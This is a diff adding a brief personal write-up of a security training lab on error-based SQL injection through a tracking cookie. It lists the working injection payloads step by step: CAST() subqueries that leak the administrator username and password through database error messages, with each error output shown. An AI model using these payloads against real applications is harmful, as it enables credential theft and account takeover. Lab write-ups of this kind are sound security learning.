@@ -1,0 +1,39 @@
+Lab: Visible error-based SQL injection
+
+ This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+
+The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 
+
+Analysis:
+
+' ERROR
+
+
+SELECT * FROM tracking WHERE id = 'xfH59HvZ6jaq7tco'--'. Expected  char
+
+CAST()
+
+xfH59HvZ6jaq7tco' AND CAST((SELECT 1) as int)--
+
+ERROR: argument of AND must be type boolean, not type integer
+
+xfH59HvZ6jaq7tco' AND 1=CAST((SELECT 1) as int)-- okay
+
+Unterminated string literal started at position 95
+only accepts an certain number of characters
+
+' AND 1=CAST((SELECT username from users) as int)--
+
+ERROR: more than one row returned by a subquery used as an expression
+
+' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
+
+ERROR: invalid input syntax for type integer: "administrator"
+
+We know now administrator is the first user
+
+' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
+
+ERROR: invalid input syntax for type integer: "1k09s2cctfuplm741iga"
+
+and here is the password :D
